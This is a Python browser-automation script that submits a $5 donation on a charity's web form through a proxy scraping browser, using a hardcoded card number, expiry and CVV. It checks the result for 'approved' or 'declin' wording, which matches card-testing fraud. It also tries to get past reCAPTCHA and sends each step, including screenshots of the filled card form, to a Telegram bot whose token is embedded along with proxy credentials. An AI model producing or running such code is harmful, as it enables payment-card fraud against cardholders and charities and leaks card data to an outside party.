#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v4 — iframe-aware + reCAPTCHA
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

# بيانات المتبرع
FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
CITY = "Carifnia"
STATE_VALUE = "1305"      # California
ZIP = "90011"
COUNTRY_VALUE = "1225"    # United States (هنحدده بالكود)

# بيانات البطاقة
CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"   # 5178... = MasterCard

# المبلغ
DONATION_AMOUNT = "5"      # $5


PFX = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def fill(frame, selector, value, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=8000)
        el.fill(str(value), timeout=5000)
        tg_msg(f"✅ {label or selector}: filled")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:120]}")
        return False


def select_option(frame, selector, value, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="attached", timeout=8000)
        try:
            el.select_option(value=value, timeout=5000)
        except Exception:
            el.select_option(label=value, timeout=5000)
        tg_msg(f"✅ {label or selector}: selected")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:120]}")
        return False


def click(frame, selector, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=8000)
        el.click(timeout=5000)
        tg_msg(f"✅ {label or selector}: clicked")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:120]}")
        return False


def run():
    tg_msg("🚀 Gift of Life Donation v4 — Start")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # ═══ 1. افتح الصفحة ═══
    tg_msg("🔄 [1] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(15)
        tg_msg("✅ Page loaded")
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return

    # ═══ 2. استنى الـ iframe ═══
    tg_msg("🔄 [2] Waiting for donation iframe...")
    frame = None
    for attempt in range(20):
        for f in page.frames:
            try:
                if "donate-now" in (f.url or "") and "Arreva" in (f.url or ""):
                    frame = f
                    break
            except Exception:
                continue
        if frame:
            break
        time.sleep(2)

    if not frame:
        tg_msg("❌ Donation iframe not found")
        return
    tg_msg(f"✅ Found iframe: {frame.url[:80]}")

    time.sleep(5)

    # ═══ 3. اختار "Other" مبلغ ═══
    tg_msg("🔄 [3] Selecting 'Other' amount...")
    click(frame, f"#{PFX}rb_amount\\:4", "Other radio")
    time.sleep(2)

    # ادخل المبلغ
    other_input = frame.locator("input[id*='other_amount'][type='text'], input[id*='otherAmount']").first
    try:
        if other_input.count() > 0:
            other_input.fill(DONATION_AMOUNT, timeout=5000)
            tg_msg(f"✅ Amount: {DONATION_AMOUNT}")
        else:
            # جرّب الملء في الـ label أو أي حقل رقمي ظاهر
            frame.evaluate(f"""(amt) => {{
                const el = document.getElementById('{PFX}other_amount') ||
                           document.querySelector('input[id*="other_amount"]');
                if (el) {{ el.value = amt; el.dispatchEvent(new Event('input', {{bubbles:true}})); }}
            }}""", DONATION_AMOUNT)
            tg_msg("⚠️ Tried JS fill")
    except Exception as e:
        tg_msg(f"⚠️ Amount: {str(e)[:120]}")

    time.sleep(2)

    # ═══ 4. املأ بيانات المتبرع ═══
    tg_msg("🔄 [4] Filling donor info...")

    fill(frame, f"#{PFX}datafirst", FIRST_NAME, "First name")
    fill(frame, f"#{PFX}datalast", LAST_NAME, "Last name")
    fill(frame, f"#{PFX}email", EMAIL, "Email")
    fill(frame, f"#{PFX}data_phone", PHONE, "Phone")
    fill(frame, f"#{PFX}data_address_one", ADDRESS_1, "Address")
    fill(frame, f"#{PFX}data_address_city", CITY, "City")
    fill(frame, f"#{PFX}data_address_zip", ZIP, "Zip")

    # Country - لازم نختار United States
    try:
        country_sel = frame.locator(f"#{PFX}data_Rcountry").first
        # دوّر على value اللي label بتاعه United States
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('#{PFX}data_Rcountry'.replace(/\\\\:/g, '\\\\\\\\:'));
            if (!sel) return null;
            for (const o of sel.options) {{
                if (o.text.toLowerCase().includes('united states')) return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option(frame, f"#{PFX}data_Rcountry", us_value, "Country")
        else:
            select_option(frame, f"#{PFX}data_Rcountry", "1225", "Country (fallback)")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:120]}")

    time.sleep(1)

    # State
    select_option(frame, f"#{PFX}data_Rstate", STATE_VALUE, "State")

    # ═══ 5. املأ بيانات البطاقة ═══
    tg_msg("🔄 [5] Filling card info...")

    fill(frame, f"#{PFX}nameOnCard", CARD_NAME, "Card name")
    fill(frame, f"#{PFX}cardNumber", CARD_NUMBER, "Card number")
    fill(frame, f"#{PFX}cardCSV", CARD_CVV, "CVV")

    select_option(frame, f"#{PFX}cardType", CARD_TYPE, "Card type")
    select_option(frame, f"#{PFX}expiration_date_month", CARD_MONTH, "Exp month")
    select_option(frame, f"#{PFX}expiration_date_year", CARD_YEAR, "Exp year")

    # ═══ 6. Screenshot قبل الـ submit ═══
    try:
        page.screenshot(path="/tmp/before_submit.png", full_page=True)
        tg_photo("/tmp/before_submit.png", "📸 Before submit")
    except Exception:
        pass

    # ═══ 7. حل reCAPTCHA ═══
    tg_msg("🔄 [7] Dealing with reCAPTCHA...")

    recaptcha_solved = False

    # جرّب الأول تحقق إن كان معلّم تلقائياً
    try:
        token = frame.evaluate(f"""() => {{
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }}""")
        if token and len(token) > 20:
            tg_msg(f"✅ reCAPTCHA already has token (len={len(token)})")
            recaptcha_solved = True
        else:
            tg_msg("⚠️ reCAPTCHA token empty, trying to solve...")
    except Exception:
        pass

    if not recaptcha_solved:
        # جرّب اضغط على checkbox reCAPTCHA جوا iframe بتاع google
        try:
            recaptcha_frame = None
            for f in page.frames:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    recaptcha_frame = f
                    break

            if recaptcha_frame:
                tg_msg("🔄 Found reCAPTCHA anchor frame")
                cb = recaptcha_frame.locator("#recaptcha-anchor").first
                cb.wait_for(state="visible", timeout=8000)
                cb.click()
                tg_msg("✅ Clicked reCAPTCHA checkbox")
                time.sleep(5)

                # راجع التوكن
                for _ in range(15):
                    token = frame.evaluate("""() => {
                        const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                        return ta ? ta.value : '';
                    }""")
                    if token and len(token) > 20:
                        tg_msg(f"✅ reCAPTCHA solved! (len={len(token)})")
                        recaptcha_solved = True
                        break
                    time.sleep(2)

                if not recaptcha_solved:
                    tg_msg("⚠️ reCAPTCHA still unsolved. Possible challenge popup.")
                    page.screenshot(path="/tmp/recaptcha.png")
                    tg_photo("/tmp/recaptcha.png", "📸 reCAPTCHA state")
            else:
                tg_msg("⚠️ reCAPTCHA anchor frame not found")
        except Exception as e:
            tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")

    # ═══ 8. اتحقق من الملء قبل الـ submit ═══
    tg_msg("🔄 [8] Verifying before submit...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (id) => {{
                const el = document.getElementById(id);
                return el ? el.value : null;
            }};
            const p = '{PFX}';
            return {{
                first: g(p+'datafirst'),
                last: g(p+'datalast'),
                email: g(p+'email'),
                phone: g(p+'data_phone'),
                addr: g(p+'data_address_one'),
                city: g(p+'data_address_city'),
                zip: g(p+'data_address_zip'),
                card_name: g(p+'nameOnCard'),
                card_num_len: (g(p+'cardNumber') || '').length,
                cvv_len: (g(p+'cardCSV') || '').length,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
                amount_total: g(p+'label_total_amount'),
            }};
        }}""")
        tg_msg(f"📋 Pre-submit state:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:120]}")

    if not recaptcha_solved:
        tg_msg("⛔ reCAPTCHA not solved — attempting submit anyway (it will likely fail)")

    # ═══ 9. اضغط Submit ═══
    tg_msg("🔄 [9] Clicking Submit...")
    submit_ok = click(frame, f"#{PFX}j_idt1913", "Submit button")

    if not submit_ok:
        tg_msg("⚠️ Submit button selector failed, trying JS click")
        try:
            frame.evaluate(f"""() => {{
                const btn = document.getElementById('{PFX}j_idt1913');
                if (btn) btn.click();
            }}""")
            tg_msg("✅ JS click sent")
        except Exception as e:
            tg_msg(f"❌ JS click: {str(e)[:120]}")

    time.sleep(8)

    # ═══ 10. اقرأ النتيجة ═══
    tg_msg("🔄 [10] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    # اقرأ من الـ iframe
    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        # ابحث عن الكلمات المهمة
        result_lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success", "approved", "declin", "error", "invalid",
                                             "thank", "confirm", "failed", "reject", "captcha",
                                             "verified", "amount", "receipt"]):
                result_lines.append(l)

        if result_lines:
            tg_msg("📊 Result keywords found:\n" + "\n".join(result_lines[:20]))
        else:
            tg_msg("⚠️ No result keywords. iframe body preview:\n<pre>"
                   + iframe_text[:2000] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Read result: {str(e)[:150]}")

    # كمان اقرأ الـ main page
    try:
        main_text = page.evaluate("document.body.innerText")
        tg_msg(f"📄 Main page text preview:\n<pre>{main_text[:1500]}</pre>")
    except Exception:
        pass

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
